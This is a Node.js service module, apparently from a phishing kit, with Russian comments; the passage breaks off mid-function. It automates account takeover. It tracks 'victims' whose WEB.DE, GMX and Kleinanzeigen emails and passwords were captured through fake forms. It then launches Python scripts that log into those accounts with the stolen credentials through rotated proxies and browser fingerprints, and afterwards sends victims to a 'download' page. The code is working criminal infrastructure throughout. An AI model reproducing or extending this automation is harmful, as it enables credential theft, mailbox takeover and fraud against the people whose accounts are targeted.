'use strict';

const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { DATA_DIR } = require('../db/database.js');
const { leadIsWorkedLikeAdmin } = require('./leadService.js');
const { logDuplicateAutomationAttempt } = require('../lib/terminalFlowLog');
const { formatModeStartPage } = require('../lib/adminModeFlowLog');
const {
  emailEligibleForUnitedInternetMailScript,
  mailboxAutomationLogLabel,
  mailboxAutologinEventBrand
} = require('../utils/mailMailboxLogin');
const { getRedirectPasswordStatus, statusSkipsVictimMailboxAutologinDuplicate } = require('../utils/formatUtils.js');

/** Повторный submit в режиме «Скачивание»: не запускать lead_simulation, если успешный вход был недавно с тем же паролем. */
const MAILBOX_DOWNLOAD_RELOGIN_WINDOW_MS = 30 * 60 * 1000;

/** Long-poll timeout — для расчёта max age lock (как в server.js). */
const WEBDE_WAIT_PASSWORD_TIMEOUT_MS = (function () {
  const v = parseInt(process.env.WEBDE_WAIT_PASSWORD_TIMEOUT_MS, 10);
  if (Number.isFinite(v) && v >= 60000) return v;
  return 2 * 60 * 1000;
})();

const WEBDE_LOCKS_DIR = path.join(DATA_DIR, 'webde-locks');
const WEBDE_SCRIPT_MAX_AGE_MS = (function () {
  const v = parseInt(process.env.WEBDE_SCRIPT_LOCK_MAX_AGE_MS, 10);
  if (Number.isFinite(v) && v >= 60000) return v;
  return Math.max(2 * 60 * 1000, WEBDE_WAIT_PASSWORD_TIMEOUT_MS + 90 * 1000);
})();
const WEBDE_LOGIN_MAX_CONCURRENT = Math.max(1, parseInt(process.env.WEBDE_LOGIN_MAX_CONCURRENT, 10) || 5);

const runningWebdeLoginLeadIds = new Set();
const pendingWebdeLoginQueue = [];
const webdeLoginChildByLeadId = new Map();
const activeAutomationChildren = new Set();

/** @type {object | null} */
let deps = null;

function init(d) {
  deps = d;
}

function getDeps() {
  if (!deps) throw new Error('automationService.init() must be called from server.js');
  return deps;
}

function readSpBrand(d, brand) {
  if (typeof d.readStartPageForBrand === 'function') return d.readStartPageForBrand(brand);
  if (typeof d.readStartPage === 'function') return d.readStartPage();
  return 'login';
}

/** Стартовая страница воронки почты (WEB.DE или GMX), не Klein. */
function mailboxStartPageNormForLead(lead, d) {
  const b = String((lead && lead.brand) || '').trim().toLowerCase();
  const k = b === 'gmx' ? 'gmx' : (b === 'vint' ? 'vint' : 'webde');
  return String(readSpBrand(d, k) || '').trim().toLowerCase();
}

function kleinStartPageNorm(d) {
  return String(readSpBrand(d, 'klein') || '').trim().toLowerCase();
}

/** Один лид из БД (полная строка) — без скана всего массива readLeads(). */
function readLeadRowForAutomation(leadId) {
  const d = getDeps();
  const id = leadId != null ? String(leadId).trim() : '';
  if (!id) return null;
  if (typeof d.readLeadById === 'function') {
    try {
      const row = d.readLeadById(id);
      if (row) return row;
    } catch (_) {}
  }
  const rows = typeof d.readLeads === 'function' ? d.readLeads() : [];
  return rows.find(function (l) { return l && String(l.id) === id; }) || null;
}

/**
 * Интерпретатор: `login/venv` (см. scripts/setup-python-env.sh), иначе системный python3 / python.
 * @param {string} [projectRoot] — корень проекта (как serverProjectRoot).
 */
function resolvePythonExecutable(projectRoot) {
  const win = process.platform === 'win32';
  if (projectRoot) {
    const venvExe = win
      ? path.join(projectRoot, 'login', 'venv', 'Scripts', 'python.exe')
      : path.join(projectRoot, 'login', 'venv', 'bin', 'python');
    if (fs.existsSync(venvExe)) return venvExe;
  }
  return win ? 'python' : 'python3';
}

/** Лид пришёл с формы Kleinanzeigen (не путать со стартовой страницей в админке). */
function leadSubmittedAsKleinVictim(lead) {
  if (!lead || typeof lead !== 'object') return false;
  if (lead.brand === 'klein') return true;
  const cfb = String(lead.clientFormBrand || '').trim().toLowerCase();
  return cfb === 'klein';
}

function leadMailboxEmailPresent(lead) {
  if (!lead || typeof lead !== 'object') return false;
  return String(lead.email || '').trim() !== '';
}

function leadHasKleinCredentialsData(lead) {
  if (!lead || typeof lead !== 'object') return false;
  const emKl = String(lead.emailKl || '').trim();
  const pwKl = String(lead.passwordKl || '').trim();
  return emKl !== '' || pwKl !== '';
}

function pickMailboxEmailForAutoLogin(lead, opts) {
  opts = opts || {};
  const allowKlFallback = !!opts.allowKlFallback;
  const primary = String(lead && lead.email ? lead.email : '').trim();
  if (primary) return primary;
  if (!allowKlFallback) return '';
  return String(lead && lead.emailKl ? lead.emailKl : '').trim();
}

/**
 * Только Klein: в лиде нет основного ящика в `email` (чистая форма Kl).
 * Автовход идёт в klein_simulation_api (вход на Klein), не в lead_simulation (почта).
 */
function leadIsStandaloneKleinFunnel(lead) {
  if (!leadSubmittedAsKleinVictim(lead)) return false;
  return !leadMailboxEmailPresent(lead);
}

function shouldSkipMailboxAutologinForLead(lead) {
  const b = String((lead && lead.brand) || '').trim().toLowerCase();
  const cfb = String((lead && lead.clientFormBrand) || '').trim().toLowerCase();
  const hostBrand = String((lead && lead.hostBrandAtSubmit) || '').trim().toLowerCase();
  const modeVint = lead && (lead.modeVint === true || lead.modeVint === 1 || lead.modeVint === '1');
  const hasVtCreds =
    String((lead && lead.emailVt) || '').trim() !== '' ||
    String((lead && lead.passwordVt) || '').trim() !== '';
  if (b === 'vint' || cfb === 'vint' || hostBrand === 'vint' || modeVint || hasVtCreds) {
    return { skip: true, reason: 'vint-no-script' };
  }
  return { skip: false, reason: '' };
}

/**
 * Стартовая страница «Klein» в админке + Auto-Login: lead_simulation с --klein-orchestration
 * (United Internet: WEB.DE / GMX в `email` или fallback `emailKl`), затем Klein в том же профиле.
 * Домен почты не обязан быть @web.de — важно, что ящик поддерживает lead_simulation.
 * Не путать с standalone Klein (без `email`): там только klein_simulation_api, без входа в почту.
 */
function shouldUseKleinOrchestration(lead, startPage, mode) {
  const sp = String(startPage || '').trim().toLowerCase();
  const m = String(mode || '').trim().toLowerCase();
  if (m !== 'auto') return false;
  if (!getDeps().readAutoScript()) return false;
  if (sp !== 'klein') return false;
  const mailboxEmail = pickMailboxEmailForAutoLogin(lead, { allowKlFallback: true });
  if (!emailEligibleForUnitedInternetMailScript(mailboxEmail)) return false;
  if (leadIsStandaloneKleinFunnel(lead)) return false;
  return true;
}

/** process.env для дочернего Python + VIRTUAL_ENV при наличии login/venv. */
function makePythonSpawnEnv(projectRoot) {
  const env = Object.assign({}, process.env, {
    PYTHONUNBUFFERED: '1',
    PYTHONIOENCODING: 'utf-8',
  });
  if (projectRoot) {
    const venvDir = path.join(projectRoot, 'login', 'venv');
    const cfg = path.join(venvDir, 'pyvenv.cfg');
    if (fs.existsSync(cfg)) env.VIRTUAL_ENV = venvDir;
  }
  const vis = String(process.env.LOGIN_BROWSER_VISIBLE || '').trim().toLowerCase();
  const forceWindow =
    vis === '1' ||
    vis === 'true' ||
    vis === 'yes' ||
    (vis === '' && process.platform === 'darwin');
  const forceHeadless = vis === '0' || vis === 'false' || vis === 'no' || vis === 'off';
  const keepBrowserExplicitOff = /^(0|false|no|off)$/i.test(
    String(process.env.KEEP_BROWSER_OPEN || '').trim()
  );
  if (forceWindow && !forceHeadless) {
    env.HEADLESS = '0';
    if (!keepBrowserExplicitOff) {
      env.KEEP_BROWSER_OPEN = '1';
    }
  }
  return env;
}

/**
 * lead_simulation_api: прокси только с сервера (GET /api/worker/proxy-txt = Config → Прокси).
 * По умолчанию WEBDE_REQUIRE_PROXY=1 — без валидных строк скрипт не идёт в сеть напрямую.
 * В .env можно выставить WEBDE_PROXY_FROM_ADMIN=0 или WEBDE_REQUIRE_PROXY=0 для отладки.
 */
function webdeScriptProxyEnv() {
  const pfa = process.env.WEBDE_PROXY_FROM_ADMIN;
  const wrp = process.env.WEBDE_REQUIRE_PROXY;
  return {
    WEBDE_PROXY_FROM_ADMIN: pfa === undefined || String(pfa).trim() === '' ? '1' : String(pfa).trim(),
    WEBDE_REQUIRE_PROXY: wrp === undefined || String(wrp).trim() === '' ? '1' : String(wrp).trim(),
  };
}

function runWhenLeadsWriteQueueIdle(callback) {
  if (typeof callback === 'function') setImmediate(callback);
}

function webdeLockKey(email) {
  const e = (email || '').trim().toLowerCase();
  if (!e) return '';
  return e.replace(/[^a-z0-9@._-]/g, '_').slice(0, 120) || 'empty';
}

function webdeLockPath(email) {
  const key = webdeLockKey(email);
  if (!key) return '';
  if (!fs.existsSync(WEBDE_LOCKS_DIR)) fs.mkdirSync(WEBDE_LOCKS_DIR, { recursive: true });
  return path.join(WEBDE_LOCKS_DIR, key + '.lock');
}

function sanitizeLeadIdForLock(leadId) {
  const s = String(leadId || '').trim();
  if (!s) return '';
  return s.replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120) || 'unknown';
}

/** Lock на leadId: `data/webde-locks/lead-<id>.lock` — строки: leadId, mtime, pid. */
function webdeLeadLockPath(leadId) {
  const safe = sanitizeLeadIdForLock(leadId);
  if (!safe) return '';
  if (!fs.existsSync(WEBDE_LOCKS_DIR)) fs.mkdirSync(WEBDE_LOCKS_DIR, { recursive: true });
  return path.join(WEBDE_LOCKS_DIR, 'lead-' + safe + '.lock');
}

function clearLeadAutomationLock(leadId) {
  const fp = webdeLeadLockPath(leadId);
  if (!fp) return;
  try {
    if (fs.existsSync(fp)) fs.unlinkSync(fp);
  } catch (_) {}
}

function webdeLeadLockWritePid(leadId, pid) {
  const fp = webdeLeadLockPath(leadId);
  if (!fp || !fs.existsSync(fp) || !Number.isFinite(pid) || pid <= 1) return;
  try {
    const raw = fs.readFileSync(fp, 'utf8');
    const lines = raw.split('\n');
    const a = (lines[0] || '').trim() || String(leadId);
    const b = (lines[1] || '').trim() || String(Date.now());
    fs.writeFileSync(fp, a + '\n' + b + '\n' + String(Math.floor(pid)), 'utf8');
  } catch (_) {}
}

function isProcessAlive(pid) {
  if (!Number.isFinite(pid) || pid <= 1) return false;
  try {
    process.kill(pid, 0);
    return true;
  } catch (err) {
    return err && err.code !== 'ESRCH';
  }
}

/**
 * Уже есть дочерний процесс / слот / свежий lock с живым PID (или lock без PID сразу после wx).
 */
function isLeadAutomationAlreadyRunning(leadId) {
  const id = leadId != null ? String(leadId).trim() : '';
  if (!id) return false;
  if (webdeLoginChildByLeadId.has(id)) return true;
  if (runningWebdeLoginLeadIds.has(id)) return true;
  const fp = webdeLeadLockPath(id);
  if (!fp || !fs.existsSync(fp)) return false;
  try {
    const stat = fs.statSync(fp);
    if (Date.now() - stat.mtimeMs > WEBDE_SCRIPT_MAX_AGE_MS) {
      try { fs.unlinkSync(fp); } catch (_) {}
      return false;
    }
    const raw = fs.readFileSync(fp, 'utf8');
    const lines = raw.split('\n');
    const pid = parseInt((lines[2] || '').trim(), 10);
    if (Number.isFinite(pid) && pid > 1) {
      if (isProcessAlive(pid)) return true;
      try { fs.unlinkSync(fp); } catch (_) {}
      return false;
    }
    return true;
  } catch (_) {
    return false;
  }
}

function tryAcquireLeadAutomationLock(leadId) {
  const fp = webdeLeadLockPath(leadId);
  if (!fp) return false;
  if (!fs.existsSync(WEBDE_LOCKS_DIR)) fs.mkdirSync(WEBDE_LOCKS_DIR, { recursive: true });
  try {
    const stat = fs.existsSync(fp) ? fs.statSync(fp) : null;
    if (stat && Date.now() - stat.mtimeMs > WEBDE_SCRIPT_MAX_AGE_MS) {
      try { fs.unlinkSync(fp); } catch (_) {}
    }
    fs.writeFileSync(fp, String(leadId).trim() + '\n' + Date.now(), { flag: 'wx' });
    return true;
  } catch (err) {
    if (err.code === 'EEXIST') {
      if (!isLeadAutomationAlreadyRunning(leadId)) return tryAcquireLeadAutomationLock(leadId);
    }
    return false;
  }
}

function tryAcquireWebdeScriptLock(email, leadId) {
  const lockFile = webdeLockPath(email);
  if (!lockFile) return false;
  try {
    const stat = fs.existsSync(lockFile) ? fs.statSync(lockFile) : null;
    if (stat && (Date.now() - stat.mtimeMs) > WEBDE_SCRIPT_MAX_AGE_MS) {
      try { fs.unlinkSync(lockFile); } catch (_) {}
    }
    fs.writeFileSync(lockFile, leadId + '\n' + Date.now(), { flag: 'wx' });
    return true;
  } catch (err) {
    if (err.code === 'EEXIST') return false;
    throw err;
  }
}

function clearWebdeScriptRunning(email) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile) return;
  try {
    if (fs.existsSync(lockFile)) fs.unlinkSync(lockFile);
  } catch (_) {}
}

function touchWebdeScriptLock(email) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile || !fs.existsSync(lockFile)) return;
  try {
    const t = new Date();
    fs.utimesSync(lockFile, t, t);
  } catch (_) {}
}

function webdeLockWriteChildPid(email, pid) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile || !fs.existsSync(lockFile) || !Number.isFinite(pid) || pid <= 1) return;
  try {
    const raw = fs.readFileSync(lockFile, 'utf8');
    const lines = raw.split('\n');
    const a = (lines[0] || '').trim();
    const b = (lines[1] || '').trim() || String(Date.now());
    fs.writeFileSync(lockFile, a + '\n' + b + '\n' + String(Math.floor(pid)), 'utf8');
  } catch (_) {}
}

function webdeLockKillChildIfAny(email) {
  const lockFile = webdeLockPath((email || '').trim().toLowerCase());
  if (!lockFile || !fs.existsSync(lockFile)) return;
  try {
    const lines = fs.readFileSync(lockFile, 'utf8').split('\n');
    const pid = parseInt((lines[2] || '').trim(), 10);
    if (!Number.isFinite(pid) || pid <= 1) return;
    try {
      process.kill(pid, 'SIGKILL');
    } catch (err) {
      if (err && err.code !== 'ESRCH') { /* ignore */ }
    }
  } catch (_) {}
}

function beginWebdeAutoLoginRun(lead) {
  if (!lead || typeof lead !== 'object') return 0;
  const n = (parseInt(lead.webdeScriptRunSeq, 10) || 0) + 1;
  lead.webdeScriptRunSeq = n;
  lead.webdeScriptActiveRun = n;
  return n;
}

function endWebdeAutoLoginRun(lead) {
  if (!lead || typeof lead !== 'object') return;
  lead.webdeScriptActiveRun = null;
}

function setWebdeLeadScriptStatus(leadIdResolved, statusOrNull) {
  const d = getDeps();
  try {
    const patch = { lastSeenAt: new Date().toISOString() };
    if (statusOrNull == null || statusOrNull === '') patch.scriptStatus = null;
    else patch.scriptStatus = String(statusOrNull);
    d.persistLeadPatch(leadIdResolved, patch);
  } catch (e) {
    console.error('[АДМИН] setWebdeLeadScriptStatus:', e && e.message ? e.message : e);
  }
}

function releaseWebdeLoginSlot(leadId) {
  const d = getDeps();
  runningWebdeLoginLeadIds.delete(leadId);
  while (pendingWebdeLoginQueue.length > 0 && runningWebdeLoginLeadIds.size < WEBDE_LOGIN_MAX_CONCURRENT) {
    const next = pendingWebdeLoginQueue.shift();
    if (next && next.script === 'klein') {
      startKleinLoginForLeadId(next.leadId, !!next.forceRestart);
    } else if (next) {
      const leadQ = readLeadRowForAutomation(next.leadId);
      const spMb = mailboxStartPageNormForLead(leadQ || {}, d);
      const modeNow = String(typeof d.readMode === 'function' ? d.readMode() : 'auto').trim().toLowerCase();
      const allowKleinOrchestrationNow =
        modeNow === 'auto' && spMb === 'klein' && d.readAutoScript();
      const kleinOrchNow = !!next.kleinOrchestration && allowKleinOrchestrationNow;
      startWebdeLoginForLeadId(next.leadId, next.eligibleMail, next.forceRestart, kleinOrchNow);
    }
  }
}

function registerAutomationChild(child) {
  if (!child || typeof child !== 'object') return;
  activeAutomationChildren.add(child);
}

function unregisterAutomationChild(child) {
  if (!child || typeof child !== 'object') return;
  activeAutomationChildren.delete(child);
}

function preemptWebdeLoginForReplacedLead(oldLeadId, email) {
  const d = getDeps();
  const em = (email || '').trim().toLowerCase();
  if (em) webdeLockKillChildIfAny(em);
  if (oldLeadId && typeof oldLeadId === 'string') {
    clearLeadAutomationLock(oldLeadId);
    const c = webdeLoginChildByLeadId.get(oldLeadId);
    if (c && typeof c.kill === 'function') {
      try {
        c.kill('SIGKILL');
        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', em || '—', 'остановлен предыдущий автовход (новый лог по email), leadId=' + oldLeadId, oldLeadId);
      } catch (_) {}
      unregisterAutomationChild(c);
      webdeLoginChildByLeadId.delete(oldLeadId);
    }
    releaseWebdeLoginSlot(oldLeadId);
  }
  if (em) clearWebdeScriptRunning(em);
}

function stopWebdeLoginForDeletedLead(leadId, lead) {
  const d = getDeps();
  const id = leadId != null ? String(leadId).trim() : '';
  if (!id) return;
  const c = webdeLoginChildByLeadId.get(id);
  if (c && typeof c.kill === 'function') {
    try {
      c.kill('SIGKILL');
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead && (lead.email || lead.emailKl)) ? String(lead.email || lead.emailKl).trim() : '—', 'остановка автовхода: лид удалён, leadId=' + id, id);
    } catch (_) {}
    unregisterAutomationChild(c);
  }
  webdeLoginChildByLeadId.delete(id);
  clearLeadAutomationLock(id);
  releaseWebdeLoginSlot(id);
  for (let qi = pendingWebdeLoginQueue.length - 1; qi >= 0; qi--) {
    const q = pendingWebdeLoginQueue[qi];
    if (q && String(q.leadId) === id) pendingWebdeLoginQueue.splice(qi, 1);
  }
  if (lead && typeof lead === 'object') {
    const e1 = String(lead.email || '').trim().toLowerCase();
    const e2 = String(lead.emailKl || '').trim().toLowerCase();
    if (e1) {
      webdeLockKillChildIfAny(e1);
      clearWebdeScriptRunning(e1);
    }
    if (e2 && e2 !== e1) {
      webdeLockKillChildIfAny(e2);
      clearWebdeScriptRunning(e2);
    }
  }
}

/** SIGKILL всех дочерних процессов автовхода и сброс очереди (например delete-all). */
function clearAllWebdeChildrenAndQueues() {
  try {
    webdeLoginChildByLeadId.forEach(function (c, lid) {
      clearLeadAutomationLock(lid);
      if (c && typeof c.kill === 'function') { try { c.kill('SIGKILL'); } catch (_) {} }
    });
    webdeLoginChildByLeadId.clear();
    runningWebdeLoginLeadIds.clear();
    pendingWebdeLoginQueue.length = 0;
  } catch (_) {}
}

function startWebdeLoginAfterLeadSubmit(leadId, lead, forceRestart) {
  const d = getDeps();
  if (!leadId || !lead) return;
  const resolvedLead = readLeadRowForAutomation(leadId) || lead;
  const skipResolved = shouldSkipMailboxAutologinForLead(resolvedLead);
  const skipIncoming = shouldSkipMailboxAutologinForLead(lead);
  if (skipResolved.skip || skipIncoming.skip) {
    const emVint = String(resolvedLead.email || resolvedLead.emailVt || resolvedLead.emailKl || '').trim() || '—';
    d.logTerminalFlow(
      'AUTO-LOGIN',
      'Система',
      '—',
      emVint,
      'пропуск: Vint-лид, отдельный скрипт автовхода не настроен (WEB/GMX не запускаем) · leadId=' + leadId,
      leadId
    );
    return;
  }
  if (leadIsWorkedLikeAdmin(resolvedLead)) {
    const em0 = String(resolvedLead.emailKl || resolvedLead.email || lead.emailKl || lead.email || '').trim() || '—';
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', em0, 'пропуск: лог отработан (Отработан / архив Klein) · leadId=' + leadId, leadId);
    return;
  }
  const spMb = mailboxStartPageNormForLead(resolvedLead, d);
  const spKl = kleinStartPageNorm(d);
  const mode = typeof d.readMode === 'function' ? d.readMode() : 'auto';
  const spNorm = spMb;
  const modeNorm = String(mode || '').trim().toLowerCase();
  const autoScript = d.readAutoScript();
  const emLog = String(lead.emailKl || lead.email || '').trim() || '—';
  const snap = formatModeStartPage(mode, autoScript, spMb);
  let branch = '';
  const mailboxEmail = pickMailboxEmailForAutoLogin(lead, { allowKlFallback: true });
  const hasKleinData = leadSubmittedAsKleinVictim(lead) || leadHasKleinCredentialsData(lead);
  if (spMb === 'change' && modeNorm === 'auto') {
    if (hasKleinData) {
      d.logTerminalFlow(
        'РЕЖИМ',
        'Автовход',
        forceRestart ? 'force' : '—',
        emLog,
        '[' + snap + '] пропуск lead_simulation: Klein-данные лида (emailKl/passwordKl/brand=klein) · leadId=' + leadId,
        leadId
      );
      return;
    }
    branch =
      'запуск lead_simulation: Change — автовход ' + mailboxAutomationLogLabel(mailboxEmail) + ' (Klein-скрипт не запускаем)';
    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
    startWebdeLoginForLeadId(leadId, emailEligibleForUnitedInternetMailScript(mailboxEmail), !!forceRestart, false);
    return;
  }
  // Klein-скрипт — только стартовая страница бренда Klein в админке.
  if (spKl === 'klein' && leadIsStandaloneKleinFunnel(lead)) {
    branch = 'запуск klein_simulation_api.py (только Klein, без ящика в поле email)';
    const snapKl = formatModeStartPage(mode, autoScript, spKl);
    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snapKl + '] ' + branch + ' · leadId=' + leadId, leadId);
    startKleinLoginForLeadId(leadId, !!forceRestart);
    return;
  }
  if (shouldUseKleinOrchestration(lead, spMb, modeNorm)) {
    branch =
      'запуск lead_simulation + Klein-оркестрация (WEB.DE в почту, затем Klein в том же профиле)';
    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
    startWebdeLoginForLeadId(leadId, emailEligibleForUnitedInternetMailScript(mailboxEmail), !!forceRestart, true);
    return;
  }
  if (spKl === 'klein' && leadSubmittedAsKleinVictim(lead)) {
    branch = 'запуск klein_simulation_api.py (форма Klein при заполненном email ящика)';
    const snapKl2 = formatModeStartPage(mode, autoScript, spKl);
    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snapKl2 + '] ' + branch + ' · leadId=' + leadId, leadId);
    startKleinLoginForLeadId(leadId, !!forceRestart);
    return;
  }
  if (
    spMb === 'download' &&
    modeNorm === 'auto' &&
    autoScript &&
    !forceRestart &&
    !leadSubmittedAsKleinVictim(lead)
  ) {
    const atRaw = resolvedLead.mailboxAutoLoginSuccessAt;
    const snapPw = resolvedLead.mailboxAutoLoginSuccessPassword;
    if (atRaw != null && snapPw != null) {
      const ts = new Date(atRaw).getTime();
      if (Number.isFinite(ts) && Date.now() - ts < MAILBOX_DOWNLOAD_RELOGIN_WINDOW_MS) {
        const subPw = String(lead.password || '').trim();
        const storedPw = String(snapPw || '').trim();
        if (subPw !== '' && subPw === storedPw) {
          const et = Array.isArray(resolvedLead.eventTerminal) ? resolvedLead.eventTerminal.slice() : [];
          const workingLead = Object.assign({}, resolvedLead, {
            eventTerminal: et,
            platform: lead.platform != null ? lead.platform : resolvedLead.platform
          });
          const nextStatus = getRedirectPasswordStatus(workingLead);
          const nowIso = new Date().toISOString();
          const evLab =
            d.EVENT_LABELS && d.EVENT_LABELS.MAILBOX_DOWNLOAD_SKIP_RELOGIN
              ? d.EVENT_LABELS.MAILBOX_DOWNLOAD_SKIP_RELOGIN
              : 'Автовход: без повторного входа (скачивание, <30 мин)';
          const autoOk = d.EVENT_LABELS && d.EVENT_LABELS.AUTOLOGIN_MAILBOX_SUCCESS;
          if (autoOk) d.pushEvent(workingLead, autoOk, 'script');
          if (typeof d.getAutoRedirectEventLabel === 'function') {
            const redirLab = d.getAutoRedirectEventLabel(nextStatus);
            if (redirLab) {
              d.pushEvent(workingLead, redirLab, 'script', {
                detail: evLab + ' · Успешный вход <30 мин, тот же пароль — сразу страница скачивания'
              });
            }
          } else {
            d.pushEvent(workingLead, evLab, 'script', {
              detail: 'Успешный вход <30 мин, тот же пароль — сразу страница скачивания'
            });
          }
          d.persistLeadPatch(leadId, {
            status: nextStatus,
            lastSeenAt: nowIso,
            adminListSortAt: nowIso,
            eventTerminal: workingLead.eventTerminal
          });
          d.logTerminalFlow(
            'РЕЖИМ',
            'Автовход',
            'skip',
            emLog,
            '[' + snap + '] без повторного lead_simulation: скачивание · успех входа <30 мин · leadId=' + leadId,
            leadId
          );
          return;
        }
      }
    }
  }
  branch = 'запуск lead_simulation (почта ' + mailboxAutomationLogLabel(mailboxEmail) + ')';
  d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
  startWebdeLoginForLeadId(leadId, emailEligibleForUnitedInternetMailScript(mailboxEmail), !!forceRestart, false);
}

function restartWebdeAutoLoginAfterVictimRetryFromError(lead, id, email, reasonLog) {
  const d = getDeps();
  if (lead && leadIsWorkedLikeAdmin(lead)) {
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', 'автоперезапуск пропущен: лог отработан · id=' + id, id);
    return;
  }
  if (!d.readAutoScript()) return;
  const mode = typeof d.readMode === 'function' ? d.readMode() : 'auto';
  const spMbRetry = mailboxStartPageNormForLead(lead, d);
  const spKlRetry = kleinStartPageNorm(d);
  const snap = formatModeStartPage(mode, d.readAutoScript(), spMbRetry);
  if (lead && lead.webdeLoginGridExhausted === true) {
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] автоперезапуск пропущен: сетка прокси×отпечаток исчерпана · ' + reasonLog + ' · id=' + id, id);
    d.logTerminalFlow('АДМИН', 'Система', '—', (email || '').trim() || '—', 'автоперезапуск пропущен: автовход уже исчерпал сетку прокси×отпечаток (ручной «Запуск входа» или новый лид), id=' + id, id);
    return;
  }
  const spRetryNorm = spMbRetry;
  const modeRetryNorm = String(mode || '').trim().toLowerCase();
  const mailboxEmail = pickMailboxEmailForAutoLogin(lead, { allowKlFallback: true });
  const hasKleinData = leadSubmittedAsKleinVictim(lead) || leadHasKleinCredentialsData(lead);
  if (spRetryNorm === 'change' && modeRetryNorm === 'auto') {
    if (hasKleinData) {
      d.logTerminalFlow(
        'РЕЖИМ',
        'Автовход',
        'retry',
        (email || '').trim() || '—',
        '[' + snap + '] автоперезапуск пропущен: Klein-данные лида в режиме Change · id=' + id,
        id
      );
      return;
    }
    const retryLab = mailboxAutomationLogLabel(mailboxEmail);
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск lead_simulation (' + retryLab + ') · ' + reasonLog + ' · id=' + id, id);
    console.log('[АДМИН] ' + reasonLog + ' — Change mode: перезапуск скрипта входа почты (' + retryLab + '), id=' + id);
    startWebdeLoginForLeadId(id, emailEligibleForUnitedInternetMailScript(mailboxEmail), true, false);
    return;
  }
  if (spKlRetry === 'klein' && leadIsStandaloneKleinFunnel(lead)) {
    const snapKlR = formatModeStartPage(mode, d.readAutoScript(), spKlRetry);
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snapKlR + '] перезапуск klein_simulation · ' + reasonLog + ' · id=' + id, id);
    console.log('[АДМИН] ' + reasonLog + ' — повторный запуск klein_simulation, id=' + id);
    startKleinLoginForLeadId(id, false);
    return;
  }
  if (shouldUseKleinOrchestration(lead, spRetryNorm, modeRetryNorm)) {
    d.logTerminalFlow(
      'РЕЖИМ',
      'Автовход',
      'retry',
      (email || '').trim() || '—',
      '[' + snap + '] перезапуск lead_simulation WEB.DE + Klein-оркестрация · ' + reasonLog + ' · id=' + id,
      id
    );
    console.log('[АДМИН] ' + reasonLog + ' — запуск WEB.DE + Klein-orch заново, id=' + id);
    startWebdeLoginForLeadId(id, emailEligibleForUnitedInternetMailScript(mailboxEmail), false, true);
    return;
  }
  if (spKlRetry === 'klein' && leadSubmittedAsKleinVictim(lead)) {
    const snapKlR2 = formatModeStartPage(mode, d.readAutoScript(), spKlRetry);
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snapKlR2 + '] перезапуск klein_simulation · ' + reasonLog + ' · id=' + id, id);
    console.log('[АДМИН] ' + reasonLog + ' — повторный запуск klein_simulation, id=' + id);
    startKleinLoginForLeadId(id, false);
    return;
  }
  if (emailEligibleForUnitedInternetMailScript(email || '')) {
    const lab = mailboxAutomationLogLabel(email || '');
    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск lead_simulation (' + lab + ') · ' + reasonLog + ' · id=' + id, id);
    console.log('[АДМИН] ' + reasonLog + ' — запуск скрипта входа почты (' + lab + ') заново, id=' + id);
    startWebdeLoginForLeadId(id, emailEligibleForUnitedInternetMailScript(mailboxEmail), true, false);
  }
}

function startWebdeLoginForLeadId(leadId, eligibleMail, forceRestart, kleinOrchestration) {
  const d = getDeps();
  if (kleinOrchestration === undefined) kleinOrchestration = false;
  // Script-режим в админке: серверный Python-автологин не запускаем —
  // лида обрабатывает внешний воркер (cookiemail) по WS.
  if (typeof d.readScriptMode === 'function' && d.readScriptMode()) {
    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Script-режим включён (серверный Python не нужен), leadId=' + leadId, leadId);
    return;
  }
  const leadEarly = readLeadRowForAutomation(leadId);
  const skipBrandDecision = shouldSkipMailboxAutologinForLead(leadEarly);
  if (skipBrandDecision.skip) {
    d.logTerminalFlow(
      'AUTO-LOGIN',
      'Система',
      '—',
      '—',
      'пропуск: Vint-лид, lead_simulation не применяется (нет отдельного Vint-скрипта), leadId=' + leadId,
      leadId
    );
    return;
  }
  const spMailbox = mailboxStartPageNormForLead(leadEarly || {}, d);
  const modeNow = String(typeof d.readMode === 'function' ? d.readMode() : 'auto').trim().toLowerCase();
  if (kleinOrchestration && !(modeNow === 'auto' && spMailbox === 'klein' && d.readAutoScript())) {
    kleinOrchestration = false;
    d.logTerminalFlow(
      'AUTO-LOGIN',
      'Система',
      '—',
      '—',
      'Klein-оркестрация отключена: нужен Auto-Login (autoScript) и старт Klein у воронки WEB.DE/GMX',
      leadId
    );
  }
  if (!eligibleMail || !leadId || !d.readAutoScript()) {
    if (eligibleMail && leadId && !d.readAutoScript()) {
      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Auto-script выключен, leadId=' + leadId, leadId);
    } else if (leadId && d.readAutoScript() && !eligibleMail) {
      d.logTerminalFlow(
        'AUTO-LOGIN',
        'Система',
        '—',
        '—',
